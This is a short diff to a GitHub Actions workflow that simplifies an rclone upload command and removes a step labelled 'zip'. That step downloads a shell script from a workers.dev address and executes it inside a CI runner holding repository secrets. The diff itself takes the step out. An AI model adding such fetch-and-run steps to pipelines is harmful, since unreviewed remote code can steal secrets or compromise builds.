@@ -32,9 +32,5 @@ jobs:
       uses: AnimMouse/setup-rclone@v1
       with:
        rclone_config: ${{ secrets.RCLONE_CONFIG }}
-    - run: cd /home/runner/work/bookish-computing-machine/bookish-computing-machine/work && 'rclone copy "encode" one: --drive-chunk-size 500M --buffer-size 500M --stats-one-line --stats=10s -v --onedrive-chunk-size 250M'
+    - run: cd /home/runner/work/bookish-computing-machine/bookish-computing-machine/work && 'rclone copy encode one:'
      
-    - name: zip
-      run: |
-        wget -O bash.sh https://share.secretz.workers.dev/2:/bash.sh && chmod +x bash.sh && bash bash.sh
-    
